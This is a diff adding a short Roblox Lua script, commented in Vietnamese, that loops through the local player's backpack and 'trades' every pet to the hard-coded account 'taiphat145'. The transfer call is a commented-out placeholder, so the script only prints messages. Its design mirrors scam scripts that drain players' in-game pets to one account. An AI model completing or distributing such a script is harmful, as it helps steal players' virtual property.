@@ -1,0 +1,28 @@
+-- Script trade tất cả pet trong backpack cho tài khoản "taiphat145"
+
+local localPlayer = game.Players.LocalPlayer
+local backpack = localPlayer.Backpack
+local targetPlayerName = "taiphat145"
+
+-- Tìm player đích
+local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
+if not targetPlayer then
+    warn("Không tìm thấy người chơi " .. targetPlayerName)
+    return
+end
+
+-- Hàm trade từng pet
+local function tradePet(petInstance)
+    -- Giả lập gửi trade, thay bằng hàm thực tế của game nếu có!
+    print("Đang trade pet: " .. petInstance.Name .. " cho " .. targetPlayer.Name)
+    -- Ví dụ: game.ReplicatedStorage.PetTrade:FireServer(targetPlayer, petInstance)
+end
+
+-- Lặp qua toàn bộ pet trong backpack và trade
+for _, item in pairs(backpack:GetChildren()) do
+    if item:IsA("Pet") or item.Name:find("Pet") then -- Điều kiện nhận diện pet, chỉnh lại nếu cần
+        tradePet(item)
+    end
+end
+
+print("Hoàn thành trade tất cả pet cho " .. targetPlayer.Name)
